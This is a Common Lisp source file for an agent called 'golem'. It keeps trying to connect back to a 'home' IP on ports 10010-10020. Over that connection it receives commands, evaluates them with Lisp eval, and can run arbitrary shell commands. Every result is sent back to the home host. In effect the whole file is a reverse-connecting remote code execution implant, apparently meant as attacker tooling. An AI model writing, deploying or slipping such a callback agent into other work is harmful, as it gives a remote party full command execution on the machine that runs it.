(defpackage golem
  (:use :cl)
  (:local-nicknames (:jzon :com.inuoe.jzon)))
(in-package :golem)

(defparameter *buffer-size* 4096)
(defvar *max-payload-length* 4294967296)
(defvar *element-type* '(unsigned-byte 8))

;; grimoire definitions

(grimoire::define-glyph :command local (command)
  (sh command))

;; utils

(defun int->bytes (number n-bytes)
  "turn a number into a buffer of n-bytes in big endian"
  (let ((buff (make-array n-bytes :element-type '(unsigned-byte 8))))
    (loop for start from 0 below (* 8 n-bytes) by 8
          for i from (1- n-bytes) downto 0
          do (setf (elt buff i) (ldb (byte 8 start) number)))
    buff))

(defun bytes->int (buff)
  "turn an array of bytes in big endian to an integer"
  (loop with len = (length buff)
        for i = 1 then (* 256 i)
        for buff-i from (1- len) downto 0
        sum (* i (elt buff buff-i))))

(defun read-payload-length (stream)
  (format t "[+] Checking payload length~%")
  (let ((buff (make-array 4)))
    (read-sequence buff stream)
    (bytes->int buff)))

(defun send-data (socket buffer)
  "send data and flush the stream"
  (format t "[+] Sending data: ~a~%" buffer)
  (let ((stream (usocket:socket-stream socket))
        (len (length buffer)))
    ;; payload cannot be bigger than 2**32 bytes (4GB)
    (assert (< len *max-payload-length*))

    ;; write the length of the payload
    (write-sequence (int->bytes len 4) stream)

    ;; write the payload
    (write-sequence buffer stream)

    (force-output stream)))

(defun recv-data (socket)
  (format t "[+] Waiting for input from home...~%")
  (multiple-value-bind (sockets remaining-time)
      (usocket:wait-for-input socket :timeout 60)
    (format t "[+] Sockets: ~a. Remaining timeout: ~a~%" 
            sockets remaining-time)
    (when (not remaining-time) (error "Timeout")))

  (format t "[+] Starting to read...~%")

  (let ((stream (usocket:socket-stream socket))
        (buffer (make-array *buffer-size*
                            :element-type *element-type*))
        (result (make-array 0
                            :element-type *element-type*
                            :adjustable t
                            :fill-pointer t)))

    (loop with payload-length = (read-payload-length stream)
          with total-read = 0
          for i = 0 then (1+ i)
          for left-to-read = (- payload-length total-read)
          for to-read = (min left-to-read *buffer-size*)
          do (format t "[+] Reading ~a to ~a. Total: ~a, left from payload: ~a~%"
                     0 to-read total-read left-to-read)
          until (or (> i 10) (<= left-to-read 0))
          do (let ((read (read-sequence buffer stream :start 0 :end to-read)))
               (setf total-read (+ total-read read))
               (setf result (concatenate 'vector result (subseq buffer 0 read)))))

    (trivial-utf-8:utf-8-bytes-to-string result)))

(defun sh (command)
  (with-output-to-string (stream)
    (uiop:run-program command :output stream)))

(defun make-response (result stdout)
  (let ((ht (make-hash-table)))
    (setf (gethash :result ht) result)
    (setf (gethash :stdout ht) stdout)
    (trivial-utf-8:string-to-utf-8-bytes
     (jzon:stringify ht))))

(defun make-easy-string ()
  (make-array
   '(0) :element-type 'base-char
   :fill-pointer 0
   :adjustable t))

(defun eval-command (command)
  (handler-case 
      (with-input-from-string (s command)
        (let* ((fake-stdout (make-easy-string)))
          (with-output-to-string (*standard-output* fake-stdout)
            (make-response (eval (read s)) fake-stdout))))
    (error (e) 
      (make-response (format nil "Failed to execute command: ~a" e) nil))))

(defun dial-home (socket)
  (loop for command = (recv-data socket)
        for exit = (string= command "(quit)")
        do (format t "[+] Received: ~a~%" command)
        if exit do (send-data socket (make-response "OK" ""))
        until exit 
        do (progn
             (format t "[+] Evaluating message from *home*...~%")
             (let ((result (handler-case (eval-command command)
                             (error (c) (jzon-bytes (format nil "ERROR! ~a~%" c) "")))))
               (format t "[+] Evaluation result: ~a...~%" result)
               (send-data socket result))))

  (finish-output (usocket:socket-stream socket))
  (usocket:socket-close socket))

(defun entry ()
  (let ((home-ip (or (car (uiop:command-line-arguments)) "localhost"))
        (start 10010) (end 10020))
    (loop for port = start then (1+ port)
          for socket = (ignore-errors
                         (usocket:socket-connect
                          home-ip port 
                          :element-type *element-type*
                          :timeout 1))
          do (format t "[+] Trying to connect to ~a:~a... ~a~%"
                     home-ip port socket)
          if socket do (ignore-errors (dial-home socket))
          if (= port end) do (setf port (1- start))
          do (sleep 1))))
